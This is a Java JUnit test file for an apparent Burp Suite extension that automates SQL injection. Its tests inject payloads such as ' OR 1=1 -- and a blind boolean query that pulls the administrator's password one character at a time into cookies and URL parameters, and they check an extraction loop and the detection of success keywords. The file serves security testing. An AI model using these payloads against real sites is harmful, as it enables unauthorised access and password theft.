package com.example.sqli;

import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.*;

class MontoyaExtensionTest {
    @Test
    void injectsCookieValueIntoRequest() {
        MontoyaExtension extension = new MontoyaExtension();

        String request = "GET /page.php?user=alice HTTP/1.1\r\n"
                + "Host: example.com\r\n"
                + "Cookie: tracking_id=abc123\r\n"
                + "\r\n";

        String updated = extension.injectPayloadIntoRequest(
                request,
                "tracking_id",
                "cookie",
                "' OR 1=1 --",
                false
        );

        assertTrue(updated.contains("tracking_id=abc123' OR 1=1 --"));
        assertTrue(updated.contains("Cookie: tracking_id=abc123' OR 1=1 --"));
    }

    @Test
    void injectsUrlParameterIntoRequest() {
        MontoyaExtension extension = new MontoyaExtension();

        String request = "GET /page.php?id=1&debug=0 HTTP/1.1\r\n"
                + "Host: example.com\r\n"
                + "\r\n";

        String updated = extension.injectPayloadIntoRequest(
                request,
                "id",
                "url",
                "' OR 1=1 --",
                true
        );

        assertTrue(updated.contains("id=%27+OR+1%3D1+--"));
        assertTrue(updated.contains("debug=0"));
    }

    @Test
    void iteratesEachPositionFromTheStartOfTheCharset() {
        String result = MontoyaExtension.iterateMatchedCharacters("abcdefghijklmnopqrstuvwxyz", 3, (candidate, position) -> {
            if (position == 1) {
                return candidate == 'r';
            }
            if (position == 2) {
                return candidate == 's';
            }
            if (position == 3) {
                return candidate == 'm';
            }
            return false;
        });

        assertEquals("rsm", result);
    }

    @Test
    void preservesOriginalCookieValueWhenAppendingPayload() {
        MontoyaExtension extension = new MontoyaExtension();

        String request = "GET / HTTP/1.1\r\n"
                + "Host: example.com\r\n"
                + "Cookie: TrackingId=7pboYBkgsByPujaa\r\n"
                + "\r\n";

        String updated = extension.injectPayloadIntoRequest(
                request,
                "TrackingId",
                "cookie",
                "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='k'",
                false
        );

        assertTrue(updated.contains("TrackingId=7pboYBkgsByPujaa' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='k'"));
    }

    @Test
    void detectsWelcomeBackResponseAsAPositiveMatch() {
        assertTrue(MontoyaExtension.isPositiveSuccessResponse("<html>Welcome back, admin!</html>"));
        assertFalse(MontoyaExtension.isPositiveSuccessResponse("<html>Login failed</html>"));
    }

    @Test
    void detectsConfiguredSuccessKeywordsForBooleanMatches() {
        assertTrue(MontoyaExtension.matchesBooleanSuccessKeywords(
                "<html>Welcome back, admin!</html>",
                "Welcome back, logged in, successful login"
        ));
        assertFalse(MontoyaExtension.matchesBooleanSuccessKeywords(
                "<html>Invalid credentials</html>",
                "Welcome back, logged in, successful login"
        ));
    }
}
